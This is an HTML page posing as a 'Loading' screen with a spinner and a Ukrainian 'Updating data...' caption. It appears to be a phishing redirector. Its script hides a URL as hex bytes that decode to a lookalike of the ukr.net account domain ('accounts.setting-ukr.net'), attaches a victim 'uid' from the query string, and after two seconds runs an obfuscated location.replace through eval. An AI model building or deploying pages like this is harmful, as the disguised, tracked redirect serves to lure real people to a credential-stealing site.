<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Loading</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f2f5;font-family:sans-serif}
        .box{text-align:center}
        .spin{width:40px;height:40px;border:4px solid #e0e0e0;border-top:4px solid #83be41;border-radius:50%;animation:r 1s linear infinite;margin:0 auto 15px}
        @keyframes r{100%{transform:rotate(360deg)}}
        p{color:#666;font-size:14px}
    </style>
</head>
<body>
    <div class="box"><div class="spin"></div><p>Актуалізація даних...</p></div>
    <script>
        var uid = new URLSearchParams(document.location.search).get('uid') || '';

        var encoded = [
            0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F,
            0x61, 0x63, 0x63, 0x6F, 0x75, 0x6E, 0x74, 0x73,
            0x2E, 0x73, 0x65, 0x74, 0x74, 0x69, 0x6E, 0x67,
            0x2D, 0x75, 0x6B, 0x72, 0x2E, 0x6E, 0x65, 0x74,
            0x2F, 0x75, 0x73, 0x65, 0x72, 0x73, 0x5F, 0x69,
            0x6E, 0x66, 0x6F, 0x5F, 0x75, 0x69, 0x64, 0x5F,
            0x63, 0x6C, 0x69, 0x65, 0x6E, 0x74, 0x3F, 0x69,
            0x64, 0x3D
        ];

        function dec(hex) {
            var str = '';
            for (var i = 0; i < hex.length; i++) {
                str += String.fromCharCode(hex[i]);
            }
            return str;
        }

        var target = dec(encoded) + uid;

        var cmd = 'window["loc"+"ation"]["re"+"place"]';
        var fullCmd = cmd + '(' + JSON.stringify(target) + ')';

        setTimeout(function() {
            eval(fullCmd);
        }, 2000);
    </script>
</body>
</html>
